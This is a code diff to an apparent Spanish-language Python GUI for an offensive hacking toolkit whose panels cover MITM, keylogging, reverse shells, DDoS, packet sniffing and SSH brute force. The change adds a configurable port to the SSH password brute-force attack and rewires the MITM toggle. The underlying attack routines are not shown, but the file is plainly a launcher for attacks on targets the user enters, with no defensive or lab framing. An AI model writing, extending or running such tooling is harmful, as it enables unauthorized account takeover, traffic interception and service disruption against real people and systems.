@@ -23,7 +23,7 @@ mitm_target = mitm_gateway = mitm_btn = None
 keylogger_file = keylogger_btn = keylogger_stop = None
 shell_ip = shell_port = None
 ddos_ip = ddos_port = ddos_duration = None
-brute_ip = brute_user = brute_wordlist = None
+brute_ip = brute_user = brute_wordlist = brute_port =None
 sniffer_iface = sniffer_filter = sniffer_time = sniffer_btn = None
 
 def update_status(message):
@@ -112,44 +112,54 @@ def start_ddos():
     ).start()
 
 def start_brute_force():
-    target = brute_ip.get()
-    user = brute_user.get()
-    wordlist = brute_wordlist.get()
-    
-    if not all([target, user, wordlist]):
+    target = brute_ip.get()  # IP del objetivo
+    user = brute_user.get()  # Usuario para el ataque
+    wordlist = brute_wordlist.get()  # Ruta del diccionario de contraseñas
+    port = brute_port.get()  # Aquí obtienes el puerto (nuevo campo)
+
+    if not all([target, user, wordlist, port]):
         messagebox.showerror("Error", "Complete todos los campos")
         return
-        
+
     if not os.path.isfile(wordlist):
         messagebox.showerror("Error", "Archivo de diccionario no encontrado")
         return
-        
-    update_status(f"Iniciando fuerza bruta contra {target}...")
+
+    try:
+        port = int(port)  # Asegúrate de que el puerto es un número
+    except ValueError:
+        messagebox.showerror("Error", "Puerto debe ser un número entero")
+        return
+
+    update_status(f"Iniciando fuerza bruta contra {target} en el puerto {port}...")
     threading.Thread(
         target=lambda: mostrar_resultado_con_descarga(
             "Fuerza Bruta",
-            f"Resultado para {user}@{target}:\n" + ssh_bruteforce(target, user, wordlist),
+            f"Resultado para {user}@{target} en el puerto {port}:\n" + ssh_bruteforce(target, user, wordlist, port),
             f"bruteforce_{target}.txt"
         ),
         daemon=True
     ).start()
 
+
 def toggle_mitm():
     global mitm_active, stop_mitm
-    
+
     if not mitm_active:
         target = mitm_target.get()
         gateway = mitm_gateway.get()
-        
+
         if not validar_ip(target) or not validar_ip(gateway):
             messagebox.showerror("Error", "IPs inválidas")
             return
-            
+
         mitm_active = True
         mitm_btn.config(text="Detener MITM")
         update_status(f"Iniciando MITM entre {target} y {gateway}")
-        
+
         stop_mitm = mitm_attack(target, gateway)
+
+
     else:
         mitm_active = False
         mitm_btn.config(text="Iniciar MITM")
@@ -267,7 +277,7 @@ def setup_gui():
     global keylogger_file, keylogger_btn, keylogger_stop
     global shell_ip, shell_port
     global ddos_ip, ddos_port, ddos_duration
-    global brute_ip, brute_user, brute_wordlist
+    global brute_ip, brute_user, brute_wordlist, brute_port
     global sniffer_iface, sniffer_filter, sniffer_time, sniffer_btn
 
     root = tk.Tk()
@@ -333,6 +343,7 @@ def setup_gui():
     
     brute_ip = crear_entrada_con_label(brute_frame, "IP Objetivo:")
     brute_user = crear_entrada_con_label(brute_frame, "Usuario:")
+    brute_port = crear_entrada_con_label(brute_frame, "Puerto:","22")
     brute_wordlist = crear_entrada_con_label(brute_frame, "Diccionario:")
     crear_boton(brute_frame, "Seleccionar Archivo", select_wordlist, colspan=1, pady=2)
     crear_boton(brute_frame, "Iniciar Fuerza Bruta", start_brute_force, colspan=1, pady=2)
